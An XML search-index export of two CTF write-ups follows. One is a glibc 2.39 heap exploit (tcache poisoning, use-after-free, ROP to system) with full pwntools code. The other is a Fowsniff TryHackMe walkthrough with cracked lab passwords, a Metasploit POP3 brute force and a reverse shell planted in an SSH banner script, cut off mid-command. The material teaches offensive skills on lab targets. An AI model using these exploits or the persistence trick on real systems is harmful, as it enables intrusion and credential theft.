<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Alice - 0xL4ugh_V5 CTF PWN writeup</title>
    <link href="/2026/01/30/Alice-0xL4ugh-V5-CTF-PWN-writeup-1/"/>
    <url>/2026/01/30/Alice-0xL4ugh-V5-CTF-PWN-writeup-1/</url>
    
    <content type="html"><![CDATA[<h2 id="Tcache-poisoning-to-RCE-UAF-gLibc-2-39"><a href="#Tcache-poisoning-to-RCE-UAF-gLibc-2-39" class="headerlink" title="Tcache poisoning to RCE - UAF - gLibc 2.39"></a><em><strong>Tcache poisoning to RCE - UAF - gLibc 2.39</strong></em></h2><p>I had the opportunity to co-author this challenge with @0xStrawHat for the 0xL4ughV5 CTF.<br>We intended a straightforward simple heap exploit yet some players solved it in smarter ways so I’ll put a link to them at the bottom :)</p><p><em>Challenge overview :</em><br>This challenge requires leveraging a use-after-free vuln to get  arbitrary read&#x2F;write to leak&#x2F;overwrite data and gain RCE.</p><p><em>Challenge files :</em><br><a href="https://github.com/0xStraw-Hat/pwn-challenges/blob/main/0xL4ugh%20v5/Alice/player.zip">player.zip</a></p><h2 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a><strong>Static analysis</strong></h2><p>The players were given the vulnerable binary and a Docker file running a 23.04 ubuntu image using glibc version 2.39.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p>The binary had all security checks enabled yet this won’t stop us from exploiting it :)</p><p><strong>Revserse Engineering the binary</strong></p><p><img src="/img/alice/ida_main.png" alt="main()"></p><p>Now this looks pretty much like any typical heap menu challenge.</p><p>By checking the create menu function we see that there are 3 main checks when allocating a memory.</p><p><img src="/img/alice/ida_create.png" alt="create()"></p><ul><li>There is a limit of 9 total allocation indexes.</li><li>Allocated indexes can’t be re-used (the ‘why’ coming later).</li><li>Maximum allocation size is 0x300.</li></ul><p>Those restrictions are trying to force the user to deal with tcache size chunks only.<br>It’s reading the correct size allocated so there is no heap overflow here.</p><p><img src="/img/alice/ida_forget.png" alt="forget()"></p><p>For the freeing function we notice 2 things : </p><ul><li>There is a freeing limit of 6.</li><li>Freeing a chunk does not null the pointer to that chunk so we have a Use-After-Free primitive , nor does it clear the allocations array, that’s why the check fails when trying to re-allocate at a previously used index in <code>create_memory()</code>.</li></ul><p><em>Tcache quick overview</em><br>tcache is a per-thread freelist (glibc ≥ 2.26) that stores recently freed small chunks (in LIFO order) to make malloc&#x2F;free faster, when a chunk is freed into tcache, its user data stores the <code>fd</code> (next free chunk) pointer. Later in glibc 2.36&gt; a hardening mechanism (Safe-Linking) was added that encodes this pointer <code>fd = next_addr ^ (heap_base &gt;&gt; 12)</code> and adds a key pointing to the thread’s tcache_perthread_struct mainly to detect double free. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//malloc.c</span><br><span class="hljs-comment">// taken from https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache_key;<br><br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>When freeing the chunk it checks its key field &amp; compares it to see if it has already been freed or not.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//malloc.c</span><br><span class="hljs-comment">// taken from https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))<br>  &#123;<br>    tcache_entry *tmp;<br>        <span class="hljs-comment">//&lt;&gt;...Snip....&lt;&gt;</span><br><span class="hljs-keyword">if</span> (tmp == e)<br>  malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>      &#125;<br>  <br></code></pre></td></tr></table></figure><h2 id="Exploit-strategy"><a href="#Exploit-strategy" class="headerlink" title="Exploit strategy"></a><strong>Exploit strategy</strong></h2><p>For the exploit I will be using those helper functions for clearer code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx, size, data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index: &#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;vivid is this memory?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;remember? &#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;rewrite?&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;memory:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recall</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;recall?&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    <span class="hljs-keyword">return</span> p.recvline().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;erase?&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">doublefree</span>(<span class="hljs-params">idx</span>):<br>    free(<span class="hljs-built_in">str</span>(idx).encode())<br>    edit(<span class="hljs-built_in">str</span>(idx).encode(),cyclic(<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#overwriting the key field to avoid double free detection</span><br>    free(<span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safelink</span>(<span class="hljs-params">ptr</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        ptr ^= (ptr &gt;&gt; <span class="hljs-number">12</span>) &amp; (<span class="hljs-number">0xff00000000000000</span> &gt;&gt; i*<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> ptr<br><br></code></pre></td></tr></table></figure><p>Thanks to the UAF bug and the fact that the the fd &amp; key are stored in the user data field, after freeing a chunk, we can view the chunk to leak the heap address and edit it to alter the fd pointer &amp; make it point to a desired known memory address.</p><h2 id="Leaking-Heap"><a href="#Leaking-Heap" class="headerlink" title="Leaking Heap "></a>Leaking Heap </h2><p>Here is a way to leak the heap addr.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">create(<span class="hljs-number">0</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats0&quot;</span>)<br>free(<span class="hljs-number">0</span>)<br>heap_key = recall(<span class="hljs-number">0</span>)<br>heap_base = safelink(unpack(heap_key.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>),<span class="hljs-string">&quot;all&quot;</span>))<br></code></pre></td></tr></table></figure><p>However the heap leak itself isn’t sufficiant, we need more.</p><p>This leads us to the think of unsorted bin, since it stores libc pointers in its metadata, making it an ideal next step for leaking the libc main_arena.</p><p>Normally, in order to reach the unsorted bin with such small chunks , the tcache class count has to reach its maximum count of 7 , which is not possible due to the limit of freeing and allocation. However , since we have a heap leak +  arbitrary write primitive on known addresses , we can either alter the tcache count on the heap, or modify an allocated chunk’s size to something larger than 0x420 then free it.</p><h2 id="Leaking-Libc"><a href="#Leaking-Libc" class="headerlink" title="Leaking Libc "></a>Leaking Libc </h2><p><strong>1- Altering Tcache Count</strong><br>The index of tcache counts is derived from the chunk size <code>(size &gt;&gt; 4) - 2</code> .  We can poison the tcache to return a pointer into that count address overwrite it with any value greater than 7.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py">create(<span class="hljs-number">0</span>, <span class="hljs-number">768</span>, <span class="hljs-string">b&quot;cats0&quot;</span>)<br>create(<span class="hljs-number">3</span>, <span class="hljs-number">768</span>-<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;cats3&quot;</span>)<br>create(<span class="hljs-number">4</span>,<span class="hljs-number">70</span>,<span class="hljs-string">b&quot;cats4&quot;</span>) <span class="hljs-comment">#guard chunk</span><br>doublefree(<span class="hljs-number">0</span>) <br>idx   = (<span class="hljs-number">0x310</span> &gt;&gt; <span class="hljs-number">4</span>) - <span class="hljs-number">2</span>   <span class="hljs-comment"># = 47</span><br>heap_addr = safelink(unpack(recall(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>),<span class="hljs-string">&quot;all&quot;</span>))<br>heap_key   = heap_addr &gt;&gt; <span class="hljs-number">12</span><br>heap_base  = heap_addr - <span class="hljs-number">0x2a0</span><br>count = heap_base  +<span class="hljs-number">0x10</span> + <span class="hljs-number">2</span>*idx -<span class="hljs-number">0xe</span> <span class="hljs-comment"># alignment</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Heap base  &quot;</span>,<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Tcache count &quot;</span>,<span class="hljs-built_in">hex</span>(count))<br>edit(<span class="hljs-number">0</span>, p64(count ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats1&quot;</span>)<br>create(<span class="hljs-number">2</span>,<span class="hljs-number">768</span>,p64(<span class="hljs-number">0x0</span>)+p32(<span class="hljs-number">0x0</span>)+p16(<span class="hljs-number">0x0</span>)+p16(<span class="hljs-number">0x99</span>)) <span class="hljs-comment"># pad until we reach the missing 0xe offset </span><br>free(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p>Then chunk 3 will be sent to unsorted bin and we can view it to get a libc leak.</p><p><strong>2- Modify an Allocated Chunk Size</strong></p><p>First we allocate chunk 0 which will be used for the poisoning , then we allocate 2 chunks that their size sum is larger than 0x420, in this case 0x300 * 2.<br>When allocating chunk 2 we place the fake chunk 2  size and fake chunk 1  size (prev size) to bypass the checks when freeing later.<br>And lastly we overwrite chunk1 size to smake it fit into unsorted bin.<br>Looks something like this :<br><img src="/img/alice/fakechunks.png" alt="fake chunks"></p><p>script :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">create(<span class="hljs-number">0</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats0&quot;</span>)<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats1&quot;</span>)<br>create(<span class="hljs-number">2</span>,<span class="hljs-number">768</span>,p64(<span class="hljs-number">0x0</span>)*(<span class="hljs-number">0x180</span>//<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x4a0</span>)+ p64(<span class="hljs-number">0x181</span>))<br><br>doublefree(<span class="hljs-number">0</span>)<br><br>heap_addr = safelink(unpack(recall(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>),<span class="hljs-string">&quot;all&quot;</span>))<br>heap_key   = heap_addr &gt;&gt; <span class="hljs-number">12</span><br>heap_base  = heap_addr - <span class="hljs-number">0x2a0</span><br>target = heap_base+ <span class="hljs-number">0x5a0</span> - <span class="hljs-number">0x10</span><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Heap base  &quot;</span>,<span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Heap Size target  &quot;</span>,<span class="hljs-built_in">hex</span>(target))<br><br>edit(<span class="hljs-number">0</span>,p64(target ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">3</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats3&quot;</span>)<br>create(<span class="hljs-number">4</span>,<span class="hljs-number">768</span>,p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x4a0</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment">#placing fake size</span><br><br>free(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure><p>And that’s it we get a libc leak by viewing chunk 1</p><p>From this point, the challenge can be solved in multiple ways, but im gonna go through the easy ‘intended’ way , leaking the stack address and then ROPing to system.<br>Libc keeps a global pointer <code>environ</code> to the program’s environment variables which are stored on the stack, so leaking environ directly leaks a stack address.</p><p>Pretty much the same steps we’ve done earlier we allocate at env &amp; view the chunk.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">libcleak = unpack(recall(<span class="hljs-number">1</span>),<span class="hljs-string">&quot;all&quot;</span>) * <span class="hljs-number">0x100</span><br>libc.address = libcleak - <span class="hljs-number">0x203b00</span><br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>environ = libc.sym.environ - <span class="hljs-number">0x18</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Leaked libc = &quot;</span>, <span class="hljs-built_in">hex</span>(libcleak))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] environ libc = &quot;</span>, <span class="hljs-built_in">hex</span>(environ))<br><br>doublefree(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,p64(environ ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">5</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats5&quot;</span>)<br>create(<span class="hljs-number">6</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&#x27;\x11&#x27;</span>*<span class="hljs-number">8</span>*<span class="hljs-number">3</span>)<span class="hljs-comment">#padding null bytes to get the full leak</span><br>stackcleak = unpack(recall(<span class="hljs-number">6</span>)[<span class="hljs-number">24</span>:],<span class="hljs-string">&quot;all&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>Next we calculate the return address offset and we allocate another chunk at it so we can overwrite it with our ROP.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>ret = stackcleak -<span class="hljs-number">0x180</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x30</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] stack  leak&quot;</span>,<span class="hljs-built_in">hex</span>(stackcleak))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ret stack  &quot;</span>,<span class="hljs-built_in">hex</span>(ret))<br><br>doublefree(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64(ret ^ heap_base &gt;&gt; <span class="hljs-number">12</span>))<br>create(<span class="hljs-number">7</span>,<span class="hljs-number">768</span>,<span class="hljs-string">b&quot;cats5&quot;</span>)<br>system_addr = libc.address + <span class="hljs-number">0x58750</span><br>binsh = libc.address + <span class="hljs-number">0x1cb42f</span><br>pop_rdi = libc.address + <span class="hljs-number">0x10f78b</span><br>ret = libc.address + <span class="hljs-number">0xbbcbe</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] System = &quot;</span>, <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] /bin/sh = &quot;</span>, <span class="hljs-built_in">hex</span>(binsh))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] pop rdi ; ret = &quot;</span>, <span class="hljs-built_in">hex</span>(pop_rdi))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ret ;  &quot;</span>, <span class="hljs-built_in">hex</span>(ret))<br><br>payload = flat(<br>    pop_rdi,<br>    binsh,<br>    ret,<br>    system_addr<br>)<br><br>create(<span class="hljs-number">8</span>,<span class="hljs-number">768</span>, p64(ret)+ payload)<br><br></code></pre></td></tr></table></figure><p>&amp; that’s it we get an RCE.</p><p>:))</p><p>You can find other solvers here:</p><ul><li><a href="https://discord.com/channels/797221129499443241/1462467876291219641/1464971063179083981">TLS overwrite</a></li><li><a href="https://discord.com/channels/797221129499443241/1462467876291219641/1464970219075145752">FSOP </a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fowsniff CTF Walkthrough</title>
    <link href="/2024/12/28/Fowsniff-CTF-Walkthrough-detailed/"/>
    <url>/2024/12/28/Fowsniff-CTF-Walkthrough-detailed/</url>
    
    <content type="html"><![CDATA[<h2 id="Hello-and-welcome-to-my-first-writeup-Even-tho-this-room-is-very-guided-I’m-gonna-try-to-go-a-bit-more-in-depth-into-it-and-hopefully-make-things-more-clear-to-my-fellow-beginners-let’s-get-started"><a href="#Hello-and-welcome-to-my-first-writeup-Even-tho-this-room-is-very-guided-I’m-gonna-try-to-go-a-bit-more-in-depth-into-it-and-hopefully-make-things-more-clear-to-my-fellow-beginners-let’s-get-started" class="headerlink" title="Hello, and welcome to my first writeup!Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my fellow beginners, let’s get started."></a>Hello, and welcome to my first writeup!<br>Even tho this room is very guided I’m gonna try to go (a bit) more in depth into it and hopefully make things more clear to my fellow beginners, let’s get started.</h2><blockquote><p><strong>Task 1 — deploy the machine</strong></p></blockquote><p>First we start with launching the attack box or openvpn if you’re using a VM</p><p>what’s openvpn? OpenVPN is a software that creates a secure connection between your computer and another network. It allows you to securely connect your computer to TryHackMe’s servers so you can safely access their rooms and challenges over the internet. It’s like a private tunnel for your online adventures ✨ more details to be found <a href="https://help.tryhackme.com/en/articles/6611809-getting-started-with-openvpn"><code>here</code></a>.<br><img src="/img/fs/image.png" alt="image"></p><ul><li><em>no answer needed</em></li></ul><blockquote><p><strong>Task 2 — What ports are open?</strong></p></blockquote><p>An Nmap scan is like a digital detective looking at a computer to find out what services it’s running. It checks all the doors and windows (all ports with -p-, uses default scripts -A to gather detailed info, and identifies software versions -sV. It’s like getting a full report on everything a computer is up to..</p><p>let’s go ahead and run our scan by typing the following command</p><blockquote><p>nmap -A -p- -sV <machine ip addr></p></blockquote><p>Bare in mind that using -p- to scan all ports might take a while(forever), for a faster scan we can simply run “nmap -sC -sV <machine ip></p><p>we’d get the following results<br><img src="/img/fs/image2.png" alt="image"></p><p>As we can see there are 4 open ports</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task 3 — Look around. What can you find?</strong></p></blockquote><p>let’s breakdown the open ports that we found</p><p>22&#x2F;tcp open ssh : SSH port means that the computer has a door (port) open and ready for Secure Shell (SSH) connections. SSH is a secure way to communicate with the computer remotely. It’s like having a secure key to the computer’s virtual door, allowing you to control it from a distance, often used for tasks like managing servers or accessing another computer’s command line.</p><p>80&#x2F;tcp open http : it means that a specific port on a computer is allowing communication via the Hypertext Transfer Protocol (HTTP). HTTP is the protocol used for transmitting data on the web. An open HTTP port typically indicates that the computer is serving web content or hosting a website. It’s like the computer having a door open specifically for web browsers and other web-related applications to communicate with it.</p><p>we can access this web page by typing the url : http:&#x2F;&#x2F;<machine ip> in our browser, it will take us to this page</p><p><img src="/img/fs/image3.png" alt="image"></p><p>interesting huh.</p><p>110&#x2F;tcp open pop3 : it means that a specific port on a computer is allowing communication via the Post Office Protocol version 3 (POP3). POP3 is a protocol used for retrieving emails from a mail server. An open POP3 port suggests that the computer is set up to receive email messages using this protocol. It’s like a designated entrance for email clients to connect and fetch emails from the server.</p><p>143&#x2F;tcp open imap : it means that a specific port on a computer is allowing communication via the Internet Message Access Protocol (IMAP). IMAP is a protocol used for accessing and managing emails on a mail server. An open IMAP port indicates that the computer is configured to handle email communications using this protocol. It’s like having a designated gateway for email clients to connect, view, and manage messages stored on the mail server</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>task 4 — can you find any public information about them?</strong></p></blockquote><p>“The attackers were also able to hijack our official @fowsniffcorp Twitter account”</p><p>let’s take a look on the account !</p><p>going through the tweets we’ll find some <a href="https://pastebin.com/378rLnGi"><code>pastebin</code></a> links in which the attacker dumped the passwords<br><img src="/img/fs/image4.png" alt="image"></p><p>we see that all passwords are hashed using md5,</p><p>md5 (The Message Digest 5) is an algorithm that turns it into a unique string of letters and numbers. Even a tiny change in the file makes the MD5 fingerprint totally different. It’s no longer secure in our modern days and became easy to crack.</p><p>Also, let’s keep in mind that MD5 is a one-way hashing algorithm, meaning it’s designed to be irreversible. However, it’s crackable by Brute forcing attacks, hashing data and trying all possible combinations until the matching target is found.</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task 5 — Can you decode these md5 hashes?</strong></p></blockquote><p>As this task suggested I will be using Hashkiller to crack those hashes</p><p>I was able to crack all of them except stone’s ,</p><p>mauer — 8a28a94a588a95b80163709ab4313aa4 — mailcall<br>mustikka — ae1644dac5b77c0cf51e0d26ad6d7e56 — bilbo101<br>tegel — 1dc352435fecca338acfd4be10984009 — apples01<br>baksteen — 19f5af754c31f1e2651edde9250d69bb — skyler22<br>seina — 90dc16d47114aa13671c697fd506cf26 — scoobydoo2<br>stone — a92b8a29ef1183192e3d35187e0cfabd — ??????<br>mursten — 0e9588cb62f4b6f27e33d449e2ba0b3b — carp4ever<br>parede — 4d6e42f56e127803285a0a7649b5ab11 — orlando12<br>sciana — f7fd98d380735e859f8b2ffbbede5a7e — 07011972</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task 6 — Can you use metasploit to brute force the pop3 login?</strong></p></blockquote><p>Basically metasploit is a tool that ethical hackers use to find and fix security problems in computer systems. We’re gonna use it to bruteforce the pop3 login service.</p><p>Before we dive into that let’s create a file with the username and another with passwords</p><blockquote><p>nano users.txt<br><img src="/img/fs/image5.png" alt="image"><br>nano passwd.txt<br><img src="/img/fs/image6.png" alt="image"></p></blockquote><p>Now let’s fire up metasploit and search for pop3 vulns:</p><p><img src="/img/fs/image7.png" alt="image"></p><p>login utility is exactly what we need,</p><blockquote><p>use 3</p></blockquote><p>we can all use “&gt; show options” to list all possible commands for this utility</p><p>Now we need to specify the target remote host (the computer you want to test or exploit), we can do so by typing the command</p><blockquote><p>set rhosts <machine ip> : This tells Metasploit that it should attempt the exploit on the specified target.</p></blockquote><blockquote><p>set user_file users.txt</p></blockquote><blockquote><p>set pass_file passwd.txt</p></blockquote><blockquote><p>set verbose flase : it instructs Metasploit to provide less detailed or verbose information during the execution of commands or modules. This can be useful when you want to reduce the amount of output to focus on essential information.</p></blockquote><p><img src="/img/fs/image8.png" alt="image"></p><p>Now we run it and wait for the magic to happen</p><blockquote><p>run<br><img src="/img/fs/image9.png" alt="image"></p></blockquote><p>We got it !!</p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task7 — What was seina’s password to the email service?</strong></p></blockquote><p>scoobydoo2</p><blockquote><p><strong>Task8 — Can you connect to the pop3 service with her credentials? What email information can you gather?</strong></p></blockquote><p>next let’s set our listener and login using the credentials we found</p><blockquote><p>nc <machine ip> 110</p></blockquote><blockquote><p>User seina</p></blockquote><blockquote><p>Pass scoobydoo2</p></blockquote><blockquote><p>LIST</p></blockquote><p><img src="/img/fs/image10.png" alt="image"></p><ul><li><em>No answer needed</em></li></ul><blockquote><p><strong>Task9 — Looking through her emails, what was a temporary password set for her?</strong></p></blockquote><p>Let’s retrieve the 1st message by typing the command RETR 1<br><img src="/img/fs/image11.png" alt="image"><br>let’s take a look at the second one RETR 2<br><img src="/img/fs/image12.png" alt="image"></p><p><code>S1ck3nBluff+secureshell</code></p><blockquote><p><strong>Task10 — connect to the machine using SSH.</strong></p></blockquote><p>We got the credentials for the ssh , let’s login !<br><img src="/img/fs/image13.png" alt="image"></p><p>by typing the “id” command we can see that baskteen is not root and is just a regular user. No problem tho, let’s searches for files owned by the “users” group on the entire system and look for something useful</p><blockquote><p>find &#x2F; -group users -type f 2&gt;&#x2F;dev&#x2F;null<br><img src="/img/fs/image14.png" alt="image"></p></blockquote><p>the hint provided by TryHackMe points at that cube.sh file , hmmm… wonder what’s in it<br><img src="/img/fs/image15.png" alt="image"><br>it’s the ssh banner, meaning this file is executed whenever we login through ssh. Perfect place to inject our reverse shell. I’ll be using the reverse shell provided by the room</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">python3 -c ‘import <span class="hljs-built_in">socket</span>,subprocess,os;s=<span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span 